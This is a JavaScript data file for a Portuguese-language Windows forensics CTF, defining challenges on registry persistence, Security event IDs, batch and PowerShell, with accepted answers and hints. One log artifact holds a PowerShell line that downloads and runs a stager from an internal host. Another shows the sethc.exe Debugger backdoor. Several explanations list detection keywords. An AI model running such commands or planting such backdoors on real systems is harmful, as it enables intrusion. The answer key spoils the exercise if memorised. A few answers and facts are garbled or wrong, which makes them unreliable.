/* ============================================================
   WinCTF — dados: categorias, desafios e referência
   ============================================================ */

const LEVELS = {
  iniciante:    { label: 'Iniciante',    pts: 100 },
  intermediario:{ label: 'Intermediário', pts: 200 },
  avancado:     { label: 'Avançado',     pts: 300 },
};

const CATEGORIES = [
  {
    id: 'config', name: 'Configurações', tag: 'Trilha 01',
    desc: 'Registro, Group Policy, serviços, PATH e persistência — onde o Windows guarda o que ele faz.',
    icon: 'gear',
    url: 'registry · gpedit · services',
  },
  {
    id: 'logs', name: 'Logs & Eventos', tag: 'Trilha 02',
    desc: 'Security, System e PowerShell Operational: correlate Event IDs e extraia o que aconteceu.',
    icon: 'pulse',
    url: 'evtx · 4624 · 4104 · sysmon',
  },
  {
    id: 'bat', name: 'Batch (.bat)', tag: 'Trilha 03',
    desc: 'Do echo ao for /f: loops, delayed expansion, redirecionamento e ofuscação em CMD.',
    icon: 'console',
    url: 'cmd · for · %~dp0 · 2>',
  },
  {
    id: 'ps1', name: 'PowerShell (.ps1)', tag: 'Trilha 04',
    desc: 'Pipeline de objetos, Get-WinEvent, -EncodedCommand e engenharia reversa de scripts.',
    icon: 'code',
    url: 'pipeline · winevent · base64',
  },
];

const CHALLENGES = [
  /* ========================= CONFIGURAÇÕES ========================= */
  {
    id: 'cfg1', cat: 'config', level: 'iniciante',
    title: 'O arquivo que não tem extensão',
    desc: 'Servidores internos estão resolvendo alguns domínios para IPs errados. Antes de culpar o DNS, vale lembrar que existe um arquivo local que intercepta resoluções — e ele não tem extensão nenhuma.',
    task: 'Qual é o caminho completo do arquivo <b>hosts</b> no Windows?',
    format: 'Formato: caminho completo, ex.: C:\\Windows\\...',
    answers: [
      'c:\\windows\\system32\\drivers\\etc\\hosts',
      'windows\\system32\\drivers\\etc\\hosts',
      '%systemroot%\\system32\\drivers\\etc\\hosts',
      'system32\\drivers\\etc\\drivers\\etc\\hosts',
      'system32\\drivers\\etc\\hosts',
      'drivers\\etc\\hosts',
      'c:\\windows\\system32\\drivers\\etc',
      'hosts',
    ],
    hints: [
      'Ele fica dentro do System32, numa pasta que finge ser de drivers...',
      'O caminho é %SystemRoot%\\System32\\drivers\\etc\\hosts — sem .txt e sem extensão alguma.',
    ],
    explain:
      `<h4>Por quê</h4>O arquivo <code>hosts</code> fica em <code>C:\\Windows\\System32\\drivers\\etc\\</code> e traduz nomes antes de o DNS ser consultado.
       <br><br><b>Detalhes que cobram em prova:</b> ele <b>não</b> tem extensão (não é <code>hosts.txt</code>); a extensão <code>.txt</code> costuma aparecer quando alguém salva errado e o Windows cria um segundo arquivo inofensivo.
       Para editá-lo você precisa de <b>administrador</b>. O mesmo diretório guarda <code>networks</code>, <code>protocol</code> e <code>services</code>.
       <br><br><b>Relacionado:</b> <code>hosts.ics</code> (IPsec) fica em <code>C:\\Windows\\System32\\drivers\\etc\\</code>... e em hostes maliciosos também se usa <code>%SystemRoot%\\System32\\drivers\\etc\\hosts</code> para bloquear atualizações/telemetria.`,
  },
  {
    id: 'cfg2', cat: 'config', level: 'iniciante',
    title: 'O console da Política de Grupo',
    desc: 'Você precisa criar uma política local que force a renovação de senha e desabilite o USB Storage. Em edições Pro/Enterprise existe um snap-in gráfico para isso — aberto via Executar.',
    task: 'Qual é o nome do arquivo <b>.msc</b> que abre o editor de Política de Grupo local?',
    format: 'Formato: nomearquivo.msc (ou só o nome)',
    answers: ['gpedit.msc', 'gpedit', 'group policy editor', 'console de diretrizes de grupo', 'diretrizes de grupo'],
    hints: [
      'Siglas: GP = Group Policy, Edit = Editor...',
      'É o gpedit.msc (Group Policy Editor). Em edições Home ele não existe de fábrica.',
    ],
    explain:
      `<h4>Por quê</h4><code>gpedit.msc</code> abre o <b>Local Group Policy Editor</b> (somente Pro/Enterprise/Education).
       <br><br><b>Onde a política vive no disco:</b> <code>C:\\Windows\\System32\\GroupPolicy\\</code> (máquina) e <code>C:\\Windows\\System32\\GroupPolicyUsers\\</code> (usuário) — com <code>GPT.ini</code> e as XMLs em <code>Machine\\Microsoft\\Windows NT\\SecEdit\\</code>.
       <br><b>Aplicar:</b> <code>gpupdate /force</code> · <b>Ver resultado:</b> <code>rsop.msc</code> · <b>Linha de comando:</b> <code>secedit.exe /configure /db secedit.sdb /cfg arquivo.inf</code>.`,
  },
  {
    id: 'cfg3', cat: 'config', level: 'intermediario',
    title: 'Quem é o intruso na lista de inicialização?',
    desc: 'Auditoria de persistência: <code>reg query</code> nas duas chaves Run. Duas entradas são de software legítimo, uma aponta para um binário em pasta pública (gravação livre por qualquer usuário).',
    task: 'Apenas UMA entrada é maliciosa. Qual é o <b>caminho completo do executável</b> dela?',
    format: 'Formato: caminho completo do .exe',
    artifact: {
      label: 'reg query (HKCU + HKLM \\...\\CurrentVersion\\Run)',
      lang: 'reg',
      content:
`HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
    OneDrive      REG_SZ    "C:\\Users\\jmoraes\\AppData\\Local\\OneDrive\\OneDrive.exe" /background
    WinUpdate     REG_SZ    "C:\\Users\\Public\\winupd.exe" --minimized --silent

HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
    SecurityHealth REG_SZ    %windir%\\system32\\SecurityHealthSystray.exe
    AdobeAAMUpdater REG_SZ   "C:\\Program Files (x86)\\Common Files\\Adobe\\OOBE\\PDApp\\UWA\\AdobeAAMUpdater.exe"`,
    },
    answers: [
      'c:\\users\\public\\winupd.exe',
      'users\\public\\winupd.exe',
      'public\\winupd.exe',
      'winupd.exe',
    ],
    hints: [
      'Percorra os caminhos: AppData do usuário, Common Files do programa... e uma pasta que é escrita por TODOS os usuários.',
      'C:\\Users\\Public é o único diretório world-writable por padrão — e o nome "WinUpdate" imita legitimidade.',
    ],
    explain:
      `<h4>Por quê</h4><code>C:\\Users\\Public\\winupd.exe</code> — <b>Public</b> é gravável por qualquer usuário (inclusive contas não-admin), então qualquer um pode trocar o binário.
       <br><br><b>Como validar:</b> <code>Get-AuthenticodeSignature</code> / <code>sigcheck.exe</code> (assinatura Microsoft vs. sem assinatura), dono do arquivo, data de criação, e se o caminho bate com o produto que diz ser.
       <br><b>Chaves Run:</b> <code>HKLM\\...\\Run</code> (todas as contas) e <code>HKCU\\...\\Run</code> (usuário logado) — além de <code>RunOnce</code>, <code>Policies\\Explorer\\Run</code> e <code>StartupApproved</code>.
       <br><b>Ferramenta:</b> Autoruns (Sysinternals) mostra tudo — incluindo entradas ocultas por padrão.`,
  },
  {
    id: 'cfg4', cat: 'config', level: 'intermediario',
    title: 'A casa de todos os serviços',
    desc: 'O alerta diz: "novo serviço instalado aponta para C:\\ProgramData\\x.exe". Você precisa inspecionar a configuração de serviços direto no registro — o mesmo lugar que o SCM (Service Control Manager) lê ao subir o sistema.',
    task: 'Qual é a chave do registro que armazena <b>todos</b> os serviços do Windows (com o valor ImagePath)?',
    format: 'Formato: HKLM\\... completo (abreviações aceitas)',
    answers: [
      'hklm\\system\\currentcontrolset\\services',
      'hkLM\\system\\currentcontrolset\\services',
      'hklm\\system\\controlset001\\services',
      'system\\currentcontrolset\\services',
      'currentcontrolset\\services',
      'hklm\\system\\currentcontrolset',
      'services',
    ],
    hints: [
      'Fica em HKLM\\SYSTEM\\... e o nome da chave contém "Current" + "Control" + "Set".',
      'É HKLM\\SYSTEM\\CurrentControlSet\\Services — uma subchave por serviço (ImagePath, Start, Type, ObjectName...).',
    ],
    explain:
      `<h4>Por quê</h4><code>HKLM\\SYSTEM\\CurrentControlSet\\Services\\&lt;nomeDoServiço&gt;</code> guarda o <code>ImagePath</code>, o <code>Start</code> (2=automático, 3=demand, 4=desabilitado), o <code>Type</code>, o <code>ObjectName</code> (conta de execução) e o <code>ObjectName</code>.
       <br><br>No disco isso é o <code>ControlSet001</code>/<code>ControlSet002</code> (o <code>CurrentControlSet</code> é o ativo na memória).
       <br><b>Eventos relacionados:</b> <b>7045</b> (System — novo serviço instalado), <b>7036</b> (entrou em execução/parou).
       <br><b>Privilégio clássico:</b> permissões fráginas na chave do serviço permitem escalada (ex.: trocar ImagePath) — é o velho "unquoted service path" + DACL errada.
       <br><b>CLI:</b> <code>sc query</code>, <code>sc qc &lt;svc&gt;</code>, <code>Get-Service | Format-List *</code>.`,
  },
  {
    id: 'cfg5', cat: 'config', level: 'avancado',
    title: 'Sticky Keys com cara de system32',
    desc: 'Durante resposta a incidente você exporta o nó do registro abaixo. Alguém configurou um "Debugger" — o Windows passa a executar OUTRO programa no lugar do binário original, antes mesmo do usuário logar.',
    task: 'Qual <b>binário</b> está sendo interceptado por esse Debugger (backdoor clássica de tela de login)?',
    format: 'Formato: nome do executável (com ou sem .exe)',
    artifact: {
      label: 'export .reg — Image File Execution Options',
      lang: 'reg',
      content:
`Windows Registry Editor Version 5.00

[HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe]
"Debugger"="C:\\Windows\\System32\\cmd.exe"
"Flags"=dword:00000002

[HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\utilman.exe]
"VerifierDlls"=""

[HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\Magnify.exe]
"UseFilter"="1"`,
    },
    answers: ['sethc.exe', 'sethc', 'c:\\windows\\system32\\sethc.exe'],
    hints: [
      'Pense na "funcionalidade de acessibilidade" que aparece na tela de login ao apertar Shift 5 vezes.',
      'É o sethc.exe (Sticky Keys) — a backdoor usa o nó Image File Execution Options\\sethc.exe com um Debugger.',
    ],
    explain:
      `<h4>Por quê</h4><code>sethc.exe</code> = Sticky Keys. Com o <code>Debugger</code> apontando para <code>cmd.exe</code>, apertar <b>Shift 5×</b> na tela de login abre um <b>prompt de SYSTEM</b> sem credenciais — a backdoor "Accessibility" famosa.
       <br><br><b>Mecanismo:</b> o nó <code>Image File Execution Options\\&lt;exe&gt;</code> serve para depuração; se existir <code>Debugger</code>, o SO executa o debugger no lugar do programa. Outro alvo clássico: <code>utilman.exe</code> (Win+U).
       <br><b>Detecção:</b> Sysmon <b>ID 13</b> (Registry value set) nesse caminho; procure também <code>GlobalFlag</code>/<code>VerifierDlls</code> (Application Verifier) — outras formas de redirecionar a carga do binário.
       <br><b>Remoção:</b> apague o valor <code>Debugger</code>, revise <code>utilman</code>/<code>Magnify</code>/<code>osk</code> e valide a integridade dos binários em <code>System32</code>.`,
  },
  {
    id: 'cfg6', cat: 'config', level: 'avancado',
    title: 'Caça ao whoami fantasma',
    desc: 'O suporte relatou que <code>whoami</code> mostra um resultado diferente do esperado nesta máquina. O binário legítimo está intacto em System32 — então alguém está sequestrando a resolução de comandos via variável de ambiente.',
    task: 'Em qual <b>lista do PATH</b> o falso whoami.exe deve ficar para ser executado <b>primeiro</b>?',
    format: 'Formato: caminho da pasta',
    artifact: {
      label: 'C:\\> set PATH',
      lang: 'bat',
      content:
`Path=C:\\Users\\Public\\bin;C:\\Windows\\system32;C:\\Windows;C:\\Windows\\System32\\Wbem
PATHEXT=.COM;.EXE;.BAT;.CMD;.PS1;.VBS

C:\\> where whoami
C:\\Users\\Public\\bin\\whoami.exe
C:\\Windows\\System32\\whoami.exe`,
    },
    answers: [
      'c:\\users\\public\\bin',
      'users\\public\\bin',
      'public\\bin',
      'c:\\users\\public\\bin\\',
    ],
    hints: [
      'O CMD percorre o PATH da ESQUERDA para a DIREITA e para no primeiro arquivo encontrado.',
      'A primeira pasta listada é C:\\Users\\Public\\bin — o próprio "where whoami" já revela a ordem.',
    ],
    explain:
      `<h4>Por quê</h4><code>C:\\Users\\Public\\bin</code> é o <b>primeiro</b> diretório do PATH: o CMD procura na ordem e usa o primeiro <code>whoami.exe</code> que achar (o <code>where</code> no artefato confirma a ordem).
       <br><br><b>Detalhes:</b> a pasta atual (<code>%CD%</code>) também é verificada, e o <code>PATHEXT</code> define a ordem de extensões (.COM antes de .EXE).
       <br><b>Ataque:</b> sequestrar <code>python</code>, <code>git</code>, <code>java</code> ou <code>whoami</code> em pasta privilegiada no PATH (filepath hijacking).
       <br><b>Defesa:</b> ajuste via <code>Sistema → Variáveis de Ambiente</code> (sysdm.cpl), remova entradas suspeitas de <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment</code> e compare com <code>where.exe /all</code>.`,
  },

  /* ========================= LOGS & EVENTOS ========================= */
  {
    id: 'evt1', cat: 'logs', level: 'iniciante',
    title: 'O nascimento de uma conta',
    desc: 'O AD audit flagrou a criação de uma conta nova fora do horário comercial. Você vai abrir o log Security no Event Viewer — mas precisa saber o ID certo para filtrar.',
    task: 'Qual é o <b>Event ID</b> do log <b>Security</b> que indica "Uma conta de usuário foi criada"?',
    format: 'Formato: número do evento',
    answers: ['4720', 'evento 4720', 'id 4720'],
    hints: [
      'Família 47xx de gestão de contas: 4720 é o "criada", 4726 é o "apagada".',
      'É o 4720 (user account created).',
    ],
    explain:
      `<h4>Por quê</h4><b>4720</b> = conta criada. A trilha completa de uma conta de backdoor no Security:
       <br>• <b>4720</b> criada → <b>4722</b> habilitada → <b>4724</b> senha redefinida → <b>4732</b> adicionada a grupo <i>local</i> (ex.: Administradores) → <b>4728</b> grupo de <i>domínio</i> → <b>4756</b> grupo universal → <b>4624</b> primeiro logon.
       <br>• Para remover: <b>4726</b> (exclusão).
       <br><br><b>Caça rápida:</b>
       <br><code>Get-WinEvent -FilterHashtable @{LogName='Security';ID=4720,4732} | Format-Table TimeCreated,Message -Auto</code>
       <br><code>wevtutil q Security /q:"*[System[(EventID=4720)]]" /rd:true</code>`,
  },
  {
    id: 'evt2', cat: 'logs', level: 'iniciante',
    title: 'Sucesso x fracasso',
    desc: 'Brute force detectado: dezenas de tentativas de logon em 2 minutos. No Event Viewer você precisa filtrar pelo ID que registra as FALHAS (o 4624, aliás, registra justamente o contrário).',
    task: 'Qual é o <b>Event ID</b> de "Falha de logon" no log Security?',
    format: 'Formato: número do evento',
    answers: ['4625', 'evento 4625', 'id 4625'],
    hints: [
      'É o "vizinho" do 4624 — só que 4624 = logon bem-sucedido.',
      'É o 4625 (An account failed to log on).',
    ],
    explain:
      `<h4>Por quê</h4><b>4625</b> = falha de logon · <b>4624</b> = logon com sucesso.
       <br><br><b>Campos que importam no 4625:</b>
       <br>• <b>Logon Type:</b> 2 = interativo (teclado), 3 = rede (SMB/share), 10 = RDP (RemoteInteractive), 5 = serviço.
       <br>• <b>Sub Status / Status:</b> <code>0xC000006A</code> senha errada · <code>0xC0000064</code> usuário inexistente · <code>0xC0000234</code> conta bloqueada · <code>0xC0000072</code> conta desabilitada · <code>0xC000006D</code> erro genérico de logon.
       <br><br>Outros essenciais: <b>4648</b> (logon com credenciais explícitas), <b>4672</b> (privilégios especiais), <b>4740</b> (conta bloqueada).`,
  },
  {
    id: 'evt3', cat: 'logs', level: 'intermediario',
    title: 'O IP das 2h da manhã',
    desc: 'Entre 01:00 e 03:00 a conta de serviço <code>CORP\\svc_sql</code> sofreu um logon que não condiz com o padrão da máquina. Abaixo, a extração cronológica dos eventos 4624/4672 do log Security.',
    task: 'Qual o <b>endereço IP de origem</b> que conquistou o logon Type 3 na conta <code>CORP\\svc_sql</code> (janela 02:00–03:00)?',
    format: 'Formato: IPv4',
    artifact: {
      label: 'Security.evtx — linhas 4624 / 4672 (14/03/2026)',
      lang: 'log',
      content:
`01:02:11  ID 4624  Conta: CORP\\jmoraes            | Logon Type 3 | Fonte de rede: 192.168.1.50
01:04:47  ID 4624  Conta: CORP\\jmoraes            | Logon Type 3 | Fonte de rede: 192.168.1.50
01:09:30  ID 4624  Conta: CORP\\svc_sql             | Logon Type 5 | Fonte de rede: -
02:14:03  ID 4624  Conta: CORP\\svc_sql             | Logon Type 3 | Fonte de rede: 10.0.0.66
02:14:52  ID 4672  Conta: CORP\\svc_sql             | Privilégios: SeDebugPrivilege, SeBackupPrivilege | LogonId: 0x8f21c
02:41:17  ID 4624  Conta: CORP\\jmoraes            | Logon Type 10 | Fonte de rede: 192.168.1.50
03:11:02  ID 4624  Conta: NT AUTHORITY\\SYSTEM     | Logon Type 5 | Fonte de rede: -`,
    },
    answers: ['10.0.0.66', '10,0,0,66'],
    hints: [
      'Ignore os Type 5 (serviço, sem origem) e os Type 10 da estação 192.168.1.50.',
      'Sobrou um único Type 3 às 02:14 — o LogonId 0x8f21c logo em seguida liga esse logon ao 4672.',
    ],
    explain:
      `<h4>Por quê</h4><code>10.0.0.66</code> — logon <b>Type 3 (rede)</b> às 02:14 na conta de serviço, seguido 49 segundos depois por <b>4672</b> concedendo <code>SeDebugPrivilege</code> (mesmo LogonId <code>0x8f21c</code>): é movement clássico.
       <br><br><b>Correlação:</b> o <b>LogonId</b> (hex) liga 4624 ↔ 4672 ↔ 4625 ↔ 5140. O 192.168.1.50 é a estação legítima (Type 3 e Type 10/RDP); Type 5 é serviço do SO e não tem origem.
       <br><b>Filtro pronto:</b>
       <br><code>Get-WinEvent -FilterHashtable @{LogName='Security';ID=4624,4672} | Where-Object {$_.TimeCreated -ge (Get-Date '02:00') -and $_.TimeCreated -lt (Get-Date '03:00')}</code>
       <br><b>Próximo passo:</b> firewall/Proxy Logs com esse IP, Sysmon ID 3 (network connect) da mesma janela.`,
  },
  {
    id: 'evt4', cat: 'logs', level: 'intermediario',
    title: 'O script que o PowerShell contou tudo',
    desc: 'O Script Block Logging está ativo e o operador achou o evento abaixo no log <code>Microsoft-Windows-PowerShell/Operational</code>. O atacante achava que esconderia o código com parâmetros ocultos.',
    task: 'Qual <b>flag</b> está registrada dentro do Script Block (evento 4104)?',
    format: 'Formato: CTF{...}',
    artifact: {
      label: 'Microsoft-Windows-PowerShell/Operational — Event ID 4104',
      lang: 'log',
      content:
`Data:            14/03/2026 02:16:44
ID do Evento:    4104   Nível: Informações   Origem: Microsoft-Windows-PowerShell
Mensagem:
  Script Block ID : 4e2c8f7a-9d11-4a6e-bb03-77c1e0a5d9f4
  Linha 1: $url = "http://10.0.0.5/stager.ps1"
  Linha 2: IEX (New-Object Net.WebClient).DownloadString($url)
  Linha 3: # rotina de coleta: hostname + ipconfig /all
  Linha 4: # CTF{scriptblock_4104}
  Conta: CORP\\jmoraes | Computador: SRV-WEB01 | PID: 4128`,
    },
    answers: ['ctf{scriptblock_4104}'],
    hints: [
      'Comentários também são gravados — o bloco registra o código-fonte COMPLETO, linha a linha.',
      'A flag está na última linha do script, atrás do #.',
    ],
    explain:
      `<h4>Por quê</h4>O <b>Script Block Logging (ID 4104)</b> grava o código-fonte <b>desobfusado</b> do bloco executado — inclusive comentários. Por isso <code>-EncodedCommand</code> e ofuscação com strings não escondem nada de quem tem esse log ativo.
       <br><br><b>Ativar:</b> GPO → Config. do Computador → Padrões → Componentes do Windows → Windows PowerShell → <i>"Ativar registro de bloco de script"</i> (Registry: <code>HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging</code>).
       <br><b>Família:</b> <b>4103</b> (Module Logging — cmdlets chamados), <b>4104</b> (script block), <b>4105/4106</b> (execução início/fim), <b>400/403</b> (engine legado).
       <br><b>Caça:</b> eventos 4104 contendo <code>DownloadString</code>, <code>IEX</code>, <code>-enc</code>, <code>FromBase64String</code> — e corrobore com o <b>4688</b> (linha de comando do processo).`,
  },
  {
    id: 'evt5', cat: 'logs', level: 'avancado',
    title: 'A trilha de quem ganhou o domínio',
    desc: 'Extração do log Security da madrugada. Uma conta foi criada, promovida e usada em seguida a partir de um host externo. O criador (helpdesk01) teve a sessão sequestrada.',
    task: 'Qual o <b>nome completo da conta</b> (domínio\\usuário) criada pelo atacante e adicionada aos Administradores?',
    format: 'Formato: DOMINIO\\usuario',
    artifact: {
      label: 'Security.evtx — correlação 02/04/2026',
      lang: 'log',
      content:
`02:58:11  ID 4720  Nova conta de usuário criada
          Objeto : CORP\\svc_backup   Criador: CORP\\helpdesk01
          DN     : CN=svc_backup,OU=Staff,DC=corp,DC=local
02:58:14  ID 4722  Conta habilitada: CORP\\svc_backup
02:58:19  ID 4732  Membro adicionado a grupo local
          Grupo : Administradores   Membro: CORP\\svc_backup   Por: CORP\\helpdesk01
02:59:03  ID 4624  Logon com sucesso
          Conta: CORP\\svc_backup   Logon Type 2   Origem: 10.0.0.66   LogonId: 0x5e113
02:59:07  ID 4672  Privilégios especiais concedidos
          Conta: CORP\\svc_backup   SeTcbPrivilege, SeDebugPrivilege`,
    },
    answers: ['corp\\svc_backup', 'svc_backup', 'corphelpdesk01\\svc_backup'],
    hints: [
      'O 4720 aponta o objeto criado; o 4732 mostra quem entrou no grupo e quem promoveu.',
      'A conta é CORP\\svc_backup (criada pelas 02:58, logon às 02:59 com Type 2 interativo).',
    ],
    explain:
      `<h4>Por quê</h4><code>CORP\\svc_backup</code> — a trilha completa em 52 segundos:
       <br><b>4720</b> (criação) → <b>4722</b> (habilitação) → <b>4732</b> (entrou em Administradores locais) → <b>4624 Type 2</b> (logon interativo da origem externa) → <b>4672</b> (SeTcbPrivilege = nível System).
       <br><br><b>Leitura defensiva:</b> o <i>criador</i> <code>CORP\\helpdesk01</code> é a conta comprometida (ou insider) — investigue a sessão dela primeiro (4624/4688 anteriores).
       <br><b>Resposta:</b> desabilite a conta, audite 4732/4728 dos últimos 30 dias e revise a política de quem pode criar contas (<code>DS Access</code> no Audit Policy).
       <br><b>Hunt:</b> <code>Get-WinEvent -FilterHashtable @{LogName='Security';ID=4720,4732,4728} | Where-Object {$_.Properties[0].Value -like '*svc_*'}</code>`,
  },
  {
    id: 'evt6', cat: 'logs', level: 'avancado',
    title: 'O comando mascarado',
    desc: 'O processo abaixo foi criado com a linha de comando completa auditada (GPO "Include command line in process creation events"). O parâmetro <code>-Enc</code> recebe Base64 de <b>UTF-16LE</b>.',
    task: 'Decodifique o argumento -Enc. <b>Qual flag</b> ele revela?',
    format: 'Formato: CTF{...}',
    artifact: {
      label: 'Security.evtx — Event ID 4688 (Process Creation)',
      lang: 'log',
      content:
`Data:            03/04/2026 23:41:08
ID do Evento:    4688   Origem: Microsoft-Windows-Security-Auditing
  Novo processo : C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe
  Processo pai  : C:\\Windows\\System32\\cmd.exe   (PID 3904)
  Conta         : CORP\\jmoraes     Elevado: Sim     LogonId: 0x3f7712
  Linha de comando:
    powershell.exe -NoP -NonI -W Hidden -Enc QwBUAEYAewBlAG4AYwBvAGQAZQBkAF8AYwBvAG0AbQBhAG4AZABfAHQAcgBpAGMAawB9AA==`,
    },
    answers: ['ctf{encoded_command_trick}'],
    hints: [
      'No PowerShell: [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String(\'...\')) — Unicode = UTF-16LE.',
      `Os primeiros bytes em Base64 "QwBUAEY" = 0x43 0x00 0x54 0x00 0x46 0x00 → 'C','T','F' com NUL entre as letras.`,
    ],
    explain:
      `<h4>Por quê</h4><code>CTF{encoded_command_trick}</code>
       <br><br><b>Como decodificar:</b>
       <br>• PowerShell: <code>[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBUAEY...'))</code>
       <br>• Bash: <code>echo 'QwBUAEY...' | base64 -d | iconv -f UTF-16LE</code>
       <br><b>Por que UTF-16LE:</b> o <code>-EncodedCommand</code> (aliases <code>-e</code>/<code>-EnC</code>) espera UTF-16LE puro (sem BOM) — decodificar como UTF-8 deixa um monte de \\x00 entre os caracteres.
       <br><b>Limites:</b> 8191 caracteres no <code>cmd</code>, ~32k no PowerShell.
       <br><b>Detecção:</b> 4688 com <code>-enc</code> + <b>4104</b> (o script block aparece <i>decodificado</i>) + Sysmon <b>ID 1</b> com CommandLine.`,
  },

  /* ========================= BATCH ========================= */
  {
    id: 'bat1', cat: 'bat', level: 'iniciante',
    title: 'Leitura rápida no console',
    desc: 'Em um script de instalação você precisa imprimir um arquivo .txt de log direto no CMD, sem abrir o Bloco de Notas e sem usar comandos de Linux.',
    task: 'Qual comando do CMD imprime o <b>conteúdo de um arquivo</b> no console?',
    format: 'Formato: comando (sem argumentos)',
    answers: ['type', 'more', 'type arquivo', 'type arquivo.txt'],
    hints: [
      'É o "contrário" de escrever: redirecionar para o console... o comando se chama igual a "digitar".',
      'É o TYPE (ex.: type instal.log). O MORE faz o mesmo, porém paginado.',
    ],
    explain:
      `<h4>Por quê</h4><code>type arquivo.txt</code> imprime o arquivo no console (funciona com UTF-16/ANSI; em UTF-8 pode falhar por BOM).
       <br><br><b>Equivalências:</b> <code>more arquivo.txt</code> (paginado) · Linux: <code>cat</code> (não existe no CMD!).
       <br><b>Vizinhos úteis:</b> <code>fc a.txt b.txt</code> (comparar), <code>findstr /i "erro" arquivo</code> (buscar), <code>copy con arquivo.txt</code> (escrever pelo console), <code>&lt;</code> (redirecionar <i>para</i> dentro de um comando).`,
  },
  {
    id: 'bat2', cat: 'bat', level: 'iniciante',
    title: 'De onde eu fui chamado?',
    desc: 'Um script <code>deploy.bat</code> precisa referenciar arquivos que estão na mesma pasta dele, independentemente do diretório atual de quem executou.',
    task: 'Qual <b>expansão de variável</b> devolve a pasta do script com a barra final? (ex.: C:\\Scripts\\)',
    format: 'Formato: a expansão exata, com % e ~',
    answers: ['%~dp0', '~dp0', '%~dp0%', 'dp0'],
    hints: [
      'Parte de %0 (o nome do script), remova as aspas com ~ e pegue drive + path com as letras d e p.',
      'É %~dp0 — d = drive, p = path, 0 = o próprio script.',
    ],
    explain:
      `<h4>Por quê</h4><code>%~dp0</code> = pasta do script com barra final (ex.: <code>C:\\Scripts\\</code>).
       <br><br><b>Tabela de %~x0:</b>
       <br>• <code>%0</code> — como o script foi chamado · <code>%~f0</code> — caminho completo · <code>%~dp0</code> — drive+pasta
       <br>• <code>%~n0</code> — nome sem extensão · <code>%~x0</code> — extensão · <code>%~s0</code> — 8.3 short path · <code>%~a0</code> — atributos
       <br><b>Padrão ouro:</b> no topo do script, <code>setlocal &amp; cd /d "%~dp0"</code> — trava o diretório de trabalho onde o script realmente está.`,
  },
  {
    id: 'bat3', cat: 'bat', level: 'intermediario',
    title: 'Varredura de log com for /f',
    desc: 'O script abaixo varre o log de autenticação e guarda algo em <code>ULT</code> a cada linha. Só a <b>última</b> linha do log contém o caractere delimitador <code>#</code>.',
    task: 'Qual é a <b>saída final</b> do echo (a flag que aparece)?',
    format: 'Formato: CTF{...}',
    artifacts: [
      {
        label: 'C:\\logs\\auth.log',
        lang: 'log',
        content:
`2026-03-14 02:11:03 CORP\\jmoraes AUTH OK
2026-03-14 02:14:22 CORP\\svc_backup AUTH FAIL
2026-03-14 02:15:40 CORP\\jmoraes AUTH OK
2026-03-14 02:31:09 CORP\\svc_backup AUTH FAIL
# auditoria manual: analista 14/03 - CTF{for_f_parse}`,
      },
      {
        label: 'parse.bat',
        lang: 'bat',
        content:
`@echo off
setlocal
set "ULT="
for /f "usebackq tokens=1* delims=#" %%a in ("C:\\logs\\auth.log") do (
    set "ULT=%%b"
)
echo %ULT%`,
      },
    ],
    answers: ['ctf{for_f_parse}'],
    hints: [
      'tokens=1* separa: %%a = tudo ANTES do delimitador, %%b = tudo DEPOIS dele.',
      'Nas linhas sem #, %%b fica vazio; só na última linha existe conteúdo depois do # — e o echo roda FORA do bloco.',
    ],
    explain:
      `<h4>Por quê</h4><code>CTF{for_f_parse}</code>
       <br><br><b>Leitura passo a passo:</b>
       <br>• <code>usebackq</code> — aspas duplas significam <i>arquivo</i> (sem ele seria uma lista literal).
       <br>• <code>delims=#</code> — o # é o separador de campos.
       <br>• <code>tokens=1*</code> — 1º campo em <code>%%a</code>, "resto da linha" em <code>%%b</code>.
       <br>• Nas 4 primeiras linhas não há # → <code>%%b</code> vazio → <code>ULT</code> vira vazio; na última linha todo o texto após o # vai para <code>ULT</code>.
       <br>• O <code>echo %ULT%</code> está fora do bloco do <code>for</code>: ele expande <i>depois</i> de todo o loop rodar → imprime o valor final.
       <br><br><b>Regra de ouro:</b> dentro de um bloco <code>( )</code>, <code>%VAR%</code> é congelado no início — use <code>EnableDelayedExpansion</code> + <code>!VAR!</code> para ler valor atualizado.`,
  },
  {
    id: 'bat4', cat: 'bat', level: 'intermediario',
    title: 'Capturando o erro, não a saída',
    desc: 'Seu script precisa gravar em arquivo apenas as mensagens de <b>erro</b> de um comando (o que o Windows chama de saída padrão de erro, handle 2), deixando a saída normal aparecer na tela.',
    task: 'Qual <b>operador</b> redireciona a stderr (handle 2) para um arquivo? Ex.: para capturar erros em erros.txt',
    format: 'Formato: operador exato (ex.: X>)',
    answers: ['2>', '2 >', '2>erros', '2>>'],
    hints: [
      'Os handles: 0 = stdin, 1 = saída normal, 2 = erro. Você precisa do número antes do sinal.',
      'É 2> (ex.: comando 2>erros.txt). O 2>> apenas acrescenta no fim do arquivo.',
    ],
    explain:
      `<h4>Por quê</h4><code>comando 2&gt;erros.txt</code> — redireciona o <b>handle 2 (stderr)</b>.
       <br><br><b>Mapa de handles:</b> <code>0&lt;</code> stdin · <code>1&gt;</code> stdout (o próprio <code>&gt;</code>) · <code>2&gt;</code> stderr.
       <br><b>Combinações essenciais:</b>
       <br>• <code>dir 2&gt;nul</code> — some com erros (o clássico <code>&gt;nul 2&gt;&amp;1</code> some com TUDO, na ordem certa!)
       <br>• <code>comando &gt; log.txt 2&gt;&amp;1</code> — junta erro + saída no mesmo arquivo (2 passa a apontar para onde 1 aponta)
       <br>• <code>dir &gt;&gt; log.txt</code> — <code>&gt;&gt;</code> <b>acrescenta</b>, <code>&gt;</code> sobrescreve
       <br>• <code>comando | findstr /i erro</code> — pipe só leva a <b>stdout</b>; para levar o erro: <code>comando 2&gt;&amp;1 | findstr ...</code>`,
  },
  {
